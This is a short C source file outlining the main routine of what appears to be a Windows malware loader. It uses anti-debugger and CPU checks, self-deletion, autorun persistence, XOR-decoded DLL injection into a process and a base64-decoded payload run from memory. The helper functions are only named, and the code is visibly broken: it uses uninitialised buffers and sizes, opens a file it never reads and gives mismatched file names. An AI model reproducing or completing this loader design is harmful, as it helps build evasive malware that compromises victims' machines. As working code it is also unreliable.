#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
int main()
{
    bool isDebugger = Debugger_Identification();

    if (isDebugger) {
        Delete_File("file1.dll");
        Delete_File("file2.bin");
        Delete_Itself();
    } else {
        bool isSupportedCPU = CPU_Identification();
        if (!isSupportedCPU) {
            Delete_File("filename.dll");
            Delete_File("file2.bin");
            Delete_Itself();
        }else {
            AutoRun();
            char* buffer1;
            char* buffer2;
            char* buffer3;

            FILE *file1 = fopen("file1.dll", "rb");

            int size1 = Load_From_File(file1, buffer1);
            String_XOR(buffer1, "tempkey");
            DLL_Injection(buffer1, 1234);
            Delete_File("file1.dll");

            FILE *file2 = fopen("file2.bin", "rb");
            int size2 = Decode_Base64(buffer2, size2, buffer3);
            Run_From_Memory(buffer3, size2);
            Delete_File("file2.bin");

            Delete_Itself();

        }
    }
}